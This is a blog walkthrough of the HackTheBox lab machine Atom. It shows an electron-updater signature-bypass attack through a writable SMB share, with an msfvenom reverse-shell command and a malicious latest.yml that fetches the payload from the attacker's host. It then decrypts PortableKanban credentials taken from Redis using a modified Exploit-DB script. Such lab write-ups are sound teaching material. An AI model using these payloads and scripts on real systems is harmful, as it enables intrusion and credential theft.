---
layout: walkthrough
title: HackTheBox - Atom
date: 2021-07-11 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/atom.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Atom --`10.10.10.237`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Atom/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bash
vagrant@ko:~/Desktop/HackTheBox/Atom$ nmap -sC -sV 10.10.10.237
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 06:55 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.48 seconds
vagrant@ko:~/Desktop/HackTheBox/Atom$ nmap -sC -sV 10.10.10.237
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 06:55 EDT
Nmap scan report for 10.10.10.237
Host is up (0.18s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
135/tcp open  msrpc        Microsoft Windows RPC
443/tcp open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h31m01s, deviation: 4h02m30s, median: 11m00s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-04-22T04:07:14-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-22T11:07:16
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.13 seconds
```
</details>

From the output shown above, we can see that the machine is a Windows machine and I added `atom.htb` to the `/etc/hosts` file. As this is a Windows machine and it only has 3 open ports, I started by browsing to the web application -- port 80 and 443 -- which both hosted the following web page:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Atom/img1.png"  style="width: 80%" />
</p>

The web page contained a username: `MrR3boot@atom.htb` and the only link which redirected was the `Download for Windows` button which redirected to: 

```url
10.10.10.237/releases/heed_setup_v1.0.0.zip
```

After downloading the Zip file, I extracted the contents and the file contained a single exe: `heedv1 Setup 1.0.0.exe`.

### Examining Heed.exe

With access to the exe, I opened up a Windows machine and started poking around the `.exe`. After opening the EXE, I was presented with the following application:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Atom/img2.png"  style="width: 80%" />
</p>

It seemed to be a simple Note Taking application. There wasn't a lot of functionality associated with the application, however there was an error stating: `Error in Auto-Updater.` I attemted to decompile the EXE with DnSpy and ILSpy, I also attempted to intercept traffic using WireShark, however none of the applications rendered any useful information. I decided to go back to the Nmap output and if required, I would return to the EXE at a later stage.


### Looking into SMB
From the Nmap scan above, it seemed as if SMB allowed for guest authentication.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Atom/img3.png"  style="width: 80%" />
</p>


Now that I knew that I had Guest access, my tool of choice is SMBMap which I ran using the following command:

```bash
smbmap -H 10.10.10.237 -d Atom -u guest
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Atom/img4.png"  style="width: 80%" />
</p>


With Read and Write access to the `Software_Updates` shared folder, I was able to retrieve the user manual for head: `UAT_Testing_Procedures.pdf`:
<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Atom/img5.png"  style="width: 80%" />
</p>


> Note taking application built with electron-builder which helps users in taking important notes.
> Very limited at the moment. There’s no server interaction when creating notes. So currently it just acts as a one-tier thick client application. We are planning to move it to a full fledged two-tier architecture sometime in the future releases.

This explains why the tools that I used when attempting to interact with the application did not return any useful information. There was a section within the document which seemed interesting:

```text
We follow the below process before releasing our products.
1. Build and install the application to make sure it works as we expect it to be.
2. Make sure that the update server running is in a private hardened instance. To initiate the QA process, just place the updates in one of the "client" folders, and the appropriate QA team will test it to ensure it finds an update and installs it correctly.
3. Follow the checklist to see if all given features are working as expected by the developer.

```

It seems as if it would be possible to create a malicious update which one of the QA testers would run on the host. Since I had Write access to the client folders, I decided to start researching exploits for Heed, or more specifically, Electron-Builder which the application is built from.

### Exploiting Electron-Builder

After a bit of searching, I came across the following blogpost by Doyensec: <https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html>.  The researchers had identified a vulnerability that could be leveraged to bypass the signature verification check -- leading to remote command execution.

In order to exploit this, I first needed to understand how the application was making use of the update. 
> During a software update, the application will request a file named `latest.yml` from the update server, which contains the definition of the new release - including the binary filename and hashes.

To exploit this vulnerability, I needed to do the following:
- Create a new `latest.yml` file
- Bypass signature verification
- Upload malicious file to SMB server's client folder

To create the EXE, I used the following MSFVenom command:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.112 LPORT=9001 -f exe -o "sh'ell.exe"
```

Now that I had the malicious file, I needed to generate a new signature that could be used to bypass the verification process. This can be easily achieved by using a filename containing a single quote and then by recalculating the file hash to match the attacker-provided binary: 

```bash
shasum -a 512 "sh'ell.exe" | cut -d " " -f1 | xxd -r -p | base64 -w 0

fbgPsCxt36iy1EnW+E2WkVWME4j7/7eO2rqCCF1545/xN+MvQF9qVSBgALcP8otB4lE9EaZC2JAh0CeBsqZQlg==
```

In order to create the `latest.yml`, I needed to make the application connect back to my machine and retrieve my reverse shell. The final file is provided below:

```yml
version: 1.2.3
path: http://10.10.14.112/sh'ell.exe
sha512: fbgPsCxt36iy1EnW+E2WkVWME4j7/7eO2rqCCF1545/xN+MvQF9qVSBgALcP8otB4lE9EaZC2JAh0CeBsqZQlg==

```

With the various items in place, I needed to perform the following:
- Create a Python server: `sudo python -m http.server 80`
- Create a netcat listener: `nc -nlvp 1234`
- Upload the `latest.yml` file: `smbmap -u 'guest' -p '' -d Atom -H 10.10.10.237 --upload latest.yml 'Software_Updates/client1/latest.yml'`

After a few seconds, the file was uploaded and I received a shell back from the host:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Atom/img6.png"  style="width: 80%" />
</p>


## Privilege Escalation using Jason
Success! With access to the host, I was now able to start basic enumeration on the Windows machine. 

<details>

```bash

echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all
echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all
 
 
whoami: 
atom\jason
jason  
 
Hostname: 
ATOM
 

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ATOM
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-A1-23
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::d57a:8f7a:28c:61dc(Preferred) 
   Temporary IPv6 Address. . . . . . : dead:beef::a01c:ddfa:cefb:8ec9(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::d57a:8f7a:28c:61dc%6(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.10.237(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:30b0%6
                                       10.10.10.2
   DNS Servers . . . . . . . . . . . : 1.1.1.1
   NetBIOS over Tcpip. . . . . . . . : Enabled


```

</details>

Within the `Downloads` folder, I found 2 directories which mentioned a PortableKanban version that made use of Redis: 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Atom/img7.png"  style="width: 80%" />
</p>

Before continuing, I performed a `netstat` on the host in order to confirm whether the redis service was listening:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Atom/img8.png"  style="width: 80%" />
</p>


I started looking for Redis related files and came across the `C:\Program Files\Redis` directory. This directory contained a number of files including:
- `redis.windows-service.conf`
- `redis.windows.conf`

###  Redis Enumeration

Within the `windows.conf` file, there were options selected that confirmed that Redis was running on port 6397. However, the `windows-service.conf` file contained the following configuration credentials:

```bash
type redis.windows-service.conf                               

# Redis configuration file example                           requirepass kidvscat_yes_kidvscat 
```

Now that I had credentials for the Redis database, I connected to the database using Redis-CLI from my Kali machine:

```
redis-cli -h host
auth kidvscat_yes_kidvscat
```
<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Atom/img9.png"  style="width: 80%" />
</p>

With access to the Redis database, I was able to begin enumerating the contents. I started by listing the server information with `info server`:

```bash
# Server
redis_version:3.0.504
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:a4f7a6e86f2d60b3
redis_mode:standalone
os:Windows  
arch_bits:64
multiplexing_api:WinSock_IOCP
process_id:7904
run_id:568daded6a2f0699fa9dcc0328a75c259c4130a8
tcp_port:6379
uptime_in_seconds:18649
uptime_in_days:0
hz:10
lru_clock:8557547
config_file:C:\Program Files\Redis\redis.windows-service.conf
```

In order to retrieve sensitive information, I needed to determine the active keys within the Database through the use of `keys *`

```bash
1) "pk:ids:User"
2) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
3) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
4) "pk:ids:MetaDataClass"
```


As shown above, there was only a default user and 1 additional user account. I retrieved the `pk:urn` and retrieved the account's details through the use of the following command:

```bash
get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
```

```json
"{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253}"

```

Success! I now had the administrator's encrypted password. Since I knew that it was the portable Kanban information that was being stored within the database, I searched for a decryption algorithm for Portable Kanban which led me to: <https://www.exploit-db.com/exploits/49409>.

<details>

```python
# Exploit Title: PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval
# Date: 9 Jan 2021
# Exploit Author: rootabeta
# Vendor Homepage: The original page, https://dmitryivanov.net/, cannot be found at this time of writing. The vulnerable software can be downloaded from https://www.softpedia.com/get/Office-tools/Diary-Organizers-Calendar/Portable-Kanban.shtml
# Software Link: https://www.softpedia.com/get/Office-tools/Diary-Organizers-Calendar/Portable-Kanban.shtml
# Version: Tested on: 4.3.6578.38136. All versions that use the similar file format are likely vulnerable.
# Tested on: Windows 10 x64. Exploit likely works on all OSs that PBK runs on. 

# PortableKanBan stores credentials in an encrypted format
# Reverse engineering the executable allows an attacker to extract credentials from local storage
# Provide this program with the path to a valid PortableKanban.pk3 file and it will extract the decoded credentials

import json
import base64
from des import * #python3 -m pip install des
import sys

try:
	path = sys.argv[1]
except:
	exit("Supply path to PortableKanban.pk3 as argv1")

def decode(hash):
	hash = base64.b64decode(hash.encode('utf-8'))
	key = DesKey(b"7ly6UznJ")
	return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')

with open(path) as f:
	try:
		data = json.load(f)
	except: #Start of file sometimes contains junk - this automatically seeks valid JSON
		broken = True
		i = 1
		while broken:
			f.seek(i,0)
			try:
				data = json.load(f)
				broken = False
			except:
				i+= 1
			

for user in data["Users"]:
	print("{}:{}".format(user["Name"],decode(user["EncryptedPassword"])))

```
</details>

The file above requires a `PortableKanban.pk3`. However, we only have the hash. In order to bypass this, I modified the code to look as follows:

<details>

```python

import json
import base64
from des import * #python3 -m pip install des
import sys

try:
        hash = sys.argv[1]
except:
        exit("Enter Encypted Hash as argv1")

def decode(hash):
        hash = base64.b64decode(hash.encode('utf-8'))
        key = DesKey(b"7ly6UznJ")
        return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')

print("{}.{}".format("Administrator",decode(hash)))

```
</details>

Once I had modified the exploit, I provided the hash as an arguement and I was able to successfully decrypt the password:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Atom/img10.png"  style="width: 80%" />
</p>

Since I knew that WinRM was open, I used Evil-WinRM and authenticated to the host as the Administrator user:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Atom/img11.png"  style="width: 80%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.